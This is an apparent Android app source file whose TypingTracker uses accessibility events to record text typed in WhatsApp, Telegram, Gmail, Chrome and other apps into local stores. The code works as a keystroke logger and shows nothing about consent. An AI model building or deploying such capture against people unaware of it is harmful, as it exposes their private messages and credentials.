package com.phonehand.app

import android.content.Context
import android.view.accessibility.AccessibilityEvent

/** Log typed text snippets per app into ActivityStore and NotesStore. */
object TypingTracker {
    private const val CHUNK_SIZE = 200

    private val APP_LABELS = mapOf(
        "com.whatsapp" to "WhatsApp",
        "org.telegram.messenger" to "Telegram",
        "com.google.android.apps.messaging" to "Messages",
        "com.facebook.orca" to "Messenger",
        "com.android.chrome" to "Chrome",
        "com.google.android.gm" to "Gmail",
        "com.instagram.android" to "Instagram",
    )

    private val lastTextByField = mutableMapOf<String, String>()

    fun onTextChanged(context: Context, event: AccessibilityEvent, fallbackPkg: String) {
        val after = event.text?.joinToString("").orEmpty()
        if (after.isEmpty()) return

        val pkg = event.packageName?.toString()?.ifBlank { null } ?: fallbackPkg
        val fieldKey = fieldKey(event, pkg)
        val beforeFromEvent = event.beforeText?.toString()
        val before = beforeFromEvent ?: lastTextByField[fieldKey].orEmpty()

        val added = extractAdded(after, before, event, fieldKey) ?: return
        lastTextByField[fieldKey] = after

        val trimmed = added.trim()
        if (trimmed.isEmpty()) return

        val app = labelFor(pkg)
        val chunks = splitChunks(trimmed, CHUNK_SIZE)
        for (chunk in chunks) {
            if (chunk.isBlank()) continue
            val snippet = chunk.trim().take(80)
            ActivityStore.add(
                context,
                type = "typing",
                app = app,
                who = "",
                preview = snippet,
            )
            NotesStore.append(context, chunk, "keyboard", pkg)
            // #region agent log
            DebugTrace.log("D", "TypingTracker.onTextChanged", "keyboard note", mapOf("app" to app, "len" to chunk.length))
            // #endregion
        }
        NotesStore.flush(context)
    }

    private fun fieldKey(event: AccessibilityEvent, pkg: String): String {
        val source = event.source
        val srcHash = source?.hashCode() ?: event.className?.hashCode() ?: 0
        source?.recycle()
        return "$pkg:$srcHash"
    }

    private fun extractAdded(
        after: String,
        before: String,
        event: AccessibilityEvent,
        fieldKey: String,
    ): String? {
        when {
            after.length > before.length && after.startsWith(before) ->
                return after.substring(before.length)
            event.addedCount > 0 && before.isEmpty() ->
                return after.takeLast(event.addedCount.coerceAtMost(after.length))
            before.isEmpty() && after.isNotEmpty() -> {
                val prev = lastTextByField[fieldKey].orEmpty()
                if (prev.isNotEmpty() && after.length > prev.length && after.startsWith(prev)) {
                    return after.substring(prev.length)
                }
                if (event.addedCount > 0) {
                    return after.takeLast(event.addedCount.coerceAtMost(after.length))
                }
                return after
            }
            event.addedCount > 0 ->
                return after.takeLast(event.addedCount.coerceAtMost(after.length))
            else -> {
                val prev = lastTextByField[fieldKey].orEmpty()
                if (after.length > prev.length && after.startsWith(prev)) {
                    return after.substring(prev.length)
                }
                if (after != prev && after.length > prev.length) {
                    return after.substring(prev.length.coerceAtMost(after.length))
                }
                return null
            }
        }
    }

    private fun splitChunks(text: String, maxLen: Int): List<String> {
        if (text.length <= maxLen) return listOf(text)
        val out = mutableListOf<String>()
        var i = 0
        while (i < text.length) {
            val end = (i + maxLen).coerceAtMost(text.length)
            out.add(text.substring(i, end))
            i = end
        }
        return out
    }

    private fun labelFor(pkg: String): String {
        APP_LABELS[pkg]?.let { return it }
        return pkg.substringAfterLast('.').replaceFirstChar { c ->
            if (c.isLowerCase()) c.titlecase() else c.toString()
        }.ifBlank { "App" }
    }
}
